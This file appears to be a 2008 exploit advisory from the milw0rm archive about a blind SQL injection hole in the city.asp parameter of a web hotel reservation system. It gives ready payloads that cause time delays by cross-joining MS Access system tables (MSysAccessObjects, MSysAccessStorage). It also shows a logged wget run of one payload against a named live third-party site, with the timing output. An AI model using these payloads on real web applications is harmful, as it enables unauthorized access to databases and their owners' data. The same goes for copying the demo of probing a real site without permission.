@@ -1,0 +1,58 @@
+# Hotel reservation System (city.asp city) Blind SQL Injection Vulnerability
+# url: http://www.softacid.net/scripts/web-hotel-reservation-system.asp
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# Greetz To: All Hackers and milw0rm website
+
+
+(blind-way): http://www.localhost/city.asp?city=['foo]
+
+NOTE:     differents injections for each database.
+NOTE (2): the Engine Microsoft Access hasn't functions time delay (not benchmark, not waitfor).
+
+Ingenious function (Consultations heavy that generate delays of time):
+
+"MS ACCESS 97, 2000"
+1) * (select max(1) from MSysAccessObjects)
+2) and (SELECT count(*) from MSysAccessObjects t1, MSysAccessObjects t2, MSysAccessObjects t3, 
+MSysAccessObjects t4, MSysAccessObjects t5, MSysAccessObjects t6) > 0 and exists (select * from MSysAccessObjects)
+
+"MS ACCESS 2003, 2007"
+1) * (select max(1) from MSysAccessStorage)
+2) and (SELECT count(*) from MSysAccessStorage t1, MSysAccessStorage t2, MSysAccessStorage t3, 
+MSysAccessStorage t4, MSysAccessStorage t5, MSysAccessStorage t6) > 0 and exists (select * from MSysAccessStorage)
+
+
+live demo: 
+heavy consultation (23:35:51<-->23:36:26):
+
+[quote]
+-------------------------------------------------------------------------------------------------------------
+joss@h4x0rz:~$ wget -v "http://www.hotelsk.net/city.asp?city=921%20and (SELECT count(*) from 
+MSysAccessStorage t1, MSysAccessStorage t2, MSysAccessStorage t3, MSysAccessStorage t4, 
+MSysAccessStorage t5, MSysAccessStorage t6) > 0 and exists (select * from MSysAccessStorage)" 
+-O result.txt --23:35:51--  http://www.hotelsk.net/city.asp?city=921%20and%20(SELECT%20count(*)%20from%20
+MSysAccessStorage%20t1,%20MSysAccessStorage%20t2,%20MSysAccessStorage%20t3,%20MSysAccessStorage%20t4,
+%20MSysAccessStorage%20t5,%20MSysAccessStorage%20t6)%20%3E%200%20and%20exists%20(select%20*%20from%20MSysAccessStorage)
+           => `result.txt'
+Resolviendo www.hotelsk.net... 67.15.59.114
+Connecting to www.hotelsk.net|67.15.59.114|:80... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 4,465 (4.4K) [text/html]
+
+100%[====================================>] 4,465         18.53K/s
+
+23:36:26 (18.53 KB/s) - `result.txt' saved [4465/4465]
+------------------------------------------------------------------------------------------------------------
+[/quote]
+
+work funny :D - In memory of rgod
+
+# milw0rm.com [2008-09-16]
